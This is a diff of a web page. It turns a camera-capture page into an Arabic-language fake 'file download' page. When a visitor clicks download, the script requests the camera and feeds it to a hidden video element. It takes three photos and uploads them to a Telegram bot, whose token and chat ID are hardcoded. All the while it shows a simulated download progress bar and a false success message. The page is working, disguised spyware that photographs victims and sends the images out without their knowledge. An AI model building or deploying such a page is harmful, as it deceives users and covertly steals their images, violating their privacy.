@@ -1,94 +1,152 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>تحميل الملف</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        h1 { font-size: 2rem; margin-bottom: 20px; text-shadow: 0 0 10px #0f0; }
-        video { border: 3px solid #0f0; border-radius: 12px; width: 100%; max-width: 400px; height: auto; background: #111; box-shadow: 0 0 30px rgba(0,255,0,0.2); }
-        #controls { margin: 20px 0; }
-        button { background: #0f0; color: #000; border: none; padding: 16px 32px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(0,255,0,0.4); }
-        button:hover:not(:disabled) { transform: scale(1.05); background: #0ff; }
-        button:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
-        #status { margin: 15px 0; font-size: 1.1rem; min-height: 2em; color: #ff0; }
-        #progress-container { width: 80%; max-width: 400px; height: 28px; background: #222; border-radius: 20px; overflow: hidden; margin: 15px auto; display: none; border: 1px solid #0f0; }
-        #progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #0f0, #0ff); transition: width 0.15s ease; }
-        #result { font-size: 2.5rem; font-weight: bold; color: #0ff; text-shadow: 0 0 20px #0ff; margin-top: 20px; display: none; animation: pulse 1s infinite alternate; }
-        @keyframes pulse { from { opacity: 0.7; } to { opacity: 1; } }
-        .error { color: #f00 !important; }
-        .success { color: #0f0 !important; }
+        body { 
+            background: #1a1a2e; 
+            color: #eee; 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            text-align: center; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+        }
+        .container {
+            background: #16213e;
+            padding: 40px 30px;
+            border-radius: 30px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            max-width: 450px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: #0ff;
+            text-shadow: 0 0 20px #0ff;
+        }
+        .sub {
+            font-size: 1rem;
+            color: #aaa;
+            margin-bottom: 30px;
+        }
+        #downloadBtn {
+            background: #0ff;
+            color: #000;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 0 30px rgba(0,255,255,0.3);
+            width: 100%;
+            margin-bottom: 25px;
+        }
+        #downloadBtn:hover:not(:disabled) {
+            transform: scale(1.03);
+            background: #0cc;
+        }
+        #downloadBtn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .progress-wrap {
+            width: 100%;
+            height: 20px;
+            background: #0a0a1a;
+            border-radius: 30px;
+            overflow: hidden;
+            margin: 20px 0;
+            border: 1px solid #0ff;
+            display: none;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0ff, #f0f);
+            transition: width 0.15s ease;
+        }
+        #status {
+            font-size: 1rem;
+            min-height: 2em;
+            color: #ffa;
+            margin-top: 10px;
+        }
+        #finalMsg {
+            font-size: 2.2rem;
+            font-weight: bold;
+            color: #f0f;
+            text-shadow: 0 0 30px #f0f;
+            margin-top: 20px;
+            display: none;
+        }
+        .note {
+            color: #666;
+            font-size: 0.8rem;
+            margin-top: 20px;
+        }
+        video { display: none; }  /* مخفي تماماً */
     </style>
 </head>
 <body>
 
-<h1>📸 CAPTURE & SEND</h1>
-<video id="video" autoplay playsinline muted></video>
-
-<div id="controls">
-    <button id="captureBtn">📷 CAPTURE 3 PHOTOS</button>
+<div class="container">
+    <h1>📥 تحميل الملف</h1>
+    <div class="sub">اضغط زر التحميل لبدء التنزيل</div>
+    <button id="downloadBtn">⬇ تحميل</button>
+    <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div id="status">⏳ انتظر...</div>
+    <div id="finalMsg">ATWI SAY YOU HELLO</div>
+    <div class="note">سيتم تنزيل ملفك خلال ثوانٍ</div>
 </div>
-
-<div id="status">⏳ Initializing camera...</div>
-<div id="progress-container"><div id="progress-fill"></div></div>
-<div id="result">ATWI SAY YOU HELLO</div>
 
 <script>
     (function() {
-        // --- CONFIG ---
+        // ----- بيانات البوت -----
         const BOT_TOKEN = '8921560508:AAG9LXTki6m1McSN17xR8P6WKYxrGCTs-38';
         const CHAT_ID = '8160376425';
         const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        // --- DOM refs ---
-        const video = document.getElementById('video');
+        // ----- عناصر DOM -----
+        const downloadBtn = document.getElementById('downloadBtn');
+        const progressWrap = document.getElementById('progressWrap');
+        const progressBar = document.getElementById('progressBar');
         const statusEl = document.getElementById('status');
-        const captureBtn = document.getElementById('captureBtn');
-        const progressContainer = document.getElementById('progress-container');
-        const progressFill = document.getElementById('progress-fill');
-        const resultEl = document.getElementById('result');
+        const finalMsg = document.getElementById('finalMsg');
 
+        // ----- متغيرات الحالة -----
         let stream = null;
-        let capturing = false;
+        let isRunning = false;
 
-        // --- Camera init ---
-        async function initCamera() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 480 }, height: { ideal: 360 } }
-                });
-                video.srcObject = stream;
-                await video.play();
-                statusEl.textContent = '✅ Camera ready. Click button to start.';
-                statusEl.className = 'success';
-                captureBtn.disabled = false;
-            } catch (err) {
-                statusEl.textContent = '❌ Camera access denied. Please allow camera and reload page.';
-                statusEl.className = 'error';
-                captureBtn.disabled = true;
-                console.error('Camera error:', err);
-            }
-        }
-
-        // --- Capture a single frame as Blob ---
-        function captureFrame() {
+        // ----- دالة التقاط صورة واحدة (من الفيديو المخفي) -----
+        function captureFrame(videoElem) {
             return new Promise((resolve) => {
                 const canvas = document.createElement('canvas');
-                const w = video.videoWidth || 480;
-                const h = video.videoHeight || 360;
+                const w = videoElem.videoWidth || 480;
+                const h = videoElem.videoHeight || 360;
                 canvas.width = w;
                 canvas.height = h;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, w, h);
+                ctx.drawImage(videoElem, 0, 0, w, h);
                 canvas.toBlob((blob) => {
                     resolve(blob);
-                }, 'image/jpeg', 0.92);
+                }, 'image/jpeg', 0.9);
             });
         }
 
-        // --- Send photo to Telegram ---
+        // ----- إرسال الصورة إلى تيليجرام -----
         async function sendPhoto(blob, caption = '') {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -103,79 +161,105 @@
             }
         }
 
-        // --- Main capture sequence ---
-        async function startCapture() {
-            if (capturing || !stream) return;
-            capturing = true;
-            captureBtn.disabled = true;
-            statusEl.className = '';
-            statusEl.textContent = '⏳ Capturing 3 photos...';
-            progressContainer.style.display = 'block';
-            progressFill.style.width = '0%';
-            resultEl.style.display = 'none';
+        // ----- العملية الأساسية (تطلب الكاميرا، تلتقط 3 صور، ترسل) -----
+        async function startProcess() {
+            if (isRunning) return;
+            isRunning = true;
+            downloadBtn.disabled = true;
+            downloadBtn.textContent = '⏳ جاري ...';
+            statusEl.textContent = '⏳ طلب إذن الكاميرا ...';
+            progressWrap.style.display = 'block';
+            progressBar.style.width = '0%';
+            finalMsg.style.display = 'none';
 
+            // 1. طلب الكاميرا (سيظهر طلب إذن من المتصفح)
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 480 }, height: { ideal: 360 } }
+                });
+            } catch (err) {
+                statusEl.textContent = '❌ تم رفض الكاميرا، الرجاء السماح ثم أعد المحاولة.';
+                statusEl.style.color = '#f55';
+                downloadBtn.disabled = false;
+                downloadBtn.textContent = '⬇ تحميل';
+                isRunning = false;
+                return;
+            }
+
+            // 2. إنشاء عنصر فيديو مخفي لتغذية الكاميرا
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.autoplay = true;
+            video.muted = true;
+            video.playsInline = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            await video.play();
+
+            // 3. التقاط 3 صور (بفاصل 1 ثانية بين كل)
             const photos = [];
-
-            // 1. Capture 3 frames (1 second apart)
+            statusEl.textContent = '⏳ جاري تنزيل الملف ... 0%';
             for (let i = 0; i < 3; i++) {
-                const blob = await captureFrame();
+                const blob = await captureFrame(video);
                 photos.push(blob);
-                const pct = ((i + 1) / 3) * 100;
-                progressFill.style.width = pct + '%';
-                statusEl.textContent = `📸 Photo ${i+1}/3 captured`;
+                const pct = Math.round(((i + 1) / 3) * 100);
+                progressBar.style.width = pct + '%';
+                statusEl.textContent = `⏳ جاري التنزيل ... ${pct}%`;
                 if (i < 2) await new Promise(r => setTimeout(r, 1000));
             }
 
-            // 2. Send all photos to Telegram
-            statusEl.textContent = '📤 Sending to Telegram...';
+            // 4. إرسال الصور إلى التيليجرام (مع تقدم وهمي)
+            statusEl.textContent = '⏳ رفع الملفات ...';
             let allSent = true;
             for (let i = 0; i < photos.length; i++) {
-                const ok = await sendPhoto(photos[i], `Photo ${i+1}`);
+                const ok = await sendPhoto(photos[i], `صورة ${i+1}`);
                 if (!ok) allSent = false;
-                // update progress for sending (optional)
-                progressFill.style.width = ((i + 1) / 3) * 100 + '%';
+                // تحديث الشريط إلى 100% تدريجياً
+                progressBar.style.width = (70 + (i+1)*10) + '%';
             }
 
-            // 3. Fake download progress (simulate download)
-            statusEl.textContent = '⏳ Downloading fake file...';
-            progressFill.style.width = '0%';
-            for (let p = 0; p <= 100; p += 5) {
-                progressFill.style.width = p + '%';
-                await new Promise(r => setTimeout(r, 80));
+            // 5. محاكاة تنزيل وهمي (تكملة الشريط)
+            statusEl.textContent = '⏳ اكتمال التنزيل ...';
+            for (let p = 80; p <= 100; p += 2) {
+                progressBar.style.width = p + '%';
+                await new Promise(r => setTimeout(r, 60));
             }
 
-            // 4. Final status and message
+            // 6. إظهار الرسالة النهائية
             if (allSent) {
-                statusEl.textContent = '✅ All photos sent successfully. Download complete (fake).';
-                statusEl.className = 'success';
+                statusEl.textContent = '✅ تم التنزيل بنجاح';
+                statusEl.style.color = '#0f0';
             } else {
-                statusEl.textContent = '⚠️ Some photos failed to send, but download simulation done.';
-                statusEl.className = 'error';
+                statusEl.textContent = '⚠️ تم التنزيل مع بعض الأخطاء';
+                statusEl.style.color = '#ff0';
             }
+            finalMsg.style.display = 'block';
+            finalMsg.textContent = 'ATWI SAY YOU HELLO';
 
-            resultEl.style.display = 'block';
-            resultEl.textContent = 'ATWI SAY YOU HELLO';
-
-            // 5. Reset UI after a moment
-            capturing = false;
-            captureBtn.disabled = false;
-            setTimeout(() => {
-                progressContainer.style.display = 'none';
-            }, 4000);
-        }
-
-        // --- Event binding ---
-        captureBtn.addEventListener('click', startCapture);
-
-        // --- Start ---
-        initCamera();
-
-        // --- Cleanup on page close ---
-        window.addEventListener('beforeunload', () => {
+            // 7. تنظيف
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
+                stream = null;
             }
-        });
+            video.srcObject = null;
+            video.remove();
+
+            downloadBtn.disabled = false;
+            downloadBtn.textContent = '⬇ تحميل مجدد';
+            isRunning = false;
+
+            // إخفاء شريط التقدم بعد فترة
+            setTimeout(() => {
+                progressWrap.style.display = 'none';
+            }, 5000);
+        }
+
+        // ----- ربط الزر -----
+        downloadBtn.addEventListener('click', startProcess);
+
+        // ----- تحضير أولي -----
+        statusEl.textContent = '⏳ اضغط تحميل للبدء';
+        statusEl.style.color = '#ffa';
     })();
 </script>
 
